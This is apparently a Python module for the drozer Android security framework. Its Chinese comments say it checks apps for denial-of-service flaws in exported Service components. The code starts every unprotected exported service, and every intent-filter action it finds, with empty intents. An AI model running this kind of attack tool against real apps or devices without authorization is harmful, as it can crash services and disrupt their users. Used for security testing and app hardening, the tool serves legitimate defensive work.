# !/usr/bin/python
# -*- coding: utf-8 -*-

'''
      
        本插件是基于drozer检测工具开发
        本插件是用于检测安卓四大组件组件中的Service组件是否存在拒绝服务的漏洞
        本插件的检测方法存在两种，一种是直接调用对外开放的Service组件，看是否存在拒绝服务
        另一种方法是通过隐式调用Service组件来检测是否存在拒绝服务的漏洞
'''

from pydiesel.reflection import ReflectionException
from drozer import android
from drozer.modules import common, Module

class service(Module, common.Filters, common.IntentFilter, common.PackageManager):
	"""docstring for ClassName"""
	name = "Gets information about exported services then Start them"
	description = "Gets information about exported services"
	example = """no"""
	author = "JadeDragon"
	date = "2015-12-06"
	license = "BSD (3 clause)"
	path = ["drozer", "attack"]
	permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

	def add_arguments(self, parser):
		parser.add_argument("-a", "--package", default = None, help = "specify the package to inspect");

	def execute(self, arguments):
		if  arguments.package == None:
			for package in self.packageManager().getPackages(common.PackageManager.GET_SERVICES):
				self.attack(arguments, package)
		else:
			package = self.packageManager().getPackageInfo(arguments.package, common.PackageManager.GET_SERVICES)

			self.attack(arguments, package)

	def attack(self, arguments, package):
		exported_services = self.match_filter(package.services, 'exported', True)
		exported_services = self.match_filter(exported_services, 'permission', "null")
		attack_component_packageName = ''
		attack_services = []
		attack_actions = []

		if len(exported_services) > 0:
			attack_component_packageName = package.packageName
			attack_services = exported_services
			for service in attack_services:
				intent_filters = self.find_intent_filters(service, 'service')
				if len(intent_filters) > 0:
					for intent_filter in intent_filters:
						if len(intent_filter.actions) > 0:
							for action in intent_filter.actions:
								if action != "android.intent.action.MAIN" and action != "":
									attack_actions.append(action)
		else :
			self.stdout.write("no exported service\n")
			return

		i = 1
		if len(attack_services) > 0:
			self.stdout.write("[color yellow]====================empty action test ====================[/color]\n")
			for attack_service in attack_services:
				try:
					self.stdout.write("     [color green][%d]: service = %s[/color]\n" % (i, attack_service.name))
					comp = (attack_component_packageName, attack_service.name)
					intent = self.new("android.content.Intent")
					com = self.new("android.content.ComponentName", *comp)
					intent.setComponent(com)
					intent.setFlags(0x10000000)
					self.getContext().startService(intent)
				except Exception:
					self.stdout.write("             [color blue]service %s start need permission....[/color]\n" % attack_service.name)
				i = i + 1
		if len(attack_actions) > 0:
			self.stdout.write("[color yellow]====================empty service test====================[/color]\n")
			for attack_action in attack_actions:
				try:
					self.stdout.write("     [color green][%d] : action = %s [/color]\n" % (i, attack_action))
					intent = self.new("android.content.Intent")
					intent.setAction(attack_action)
					intent.setFlags(0x10000000)
					self.getContext().startService(intent)
				except Exception:
					self.stdout.write("             [color blue]action %s start failure....[/color]\n" % attack_action)
				i = i + 1
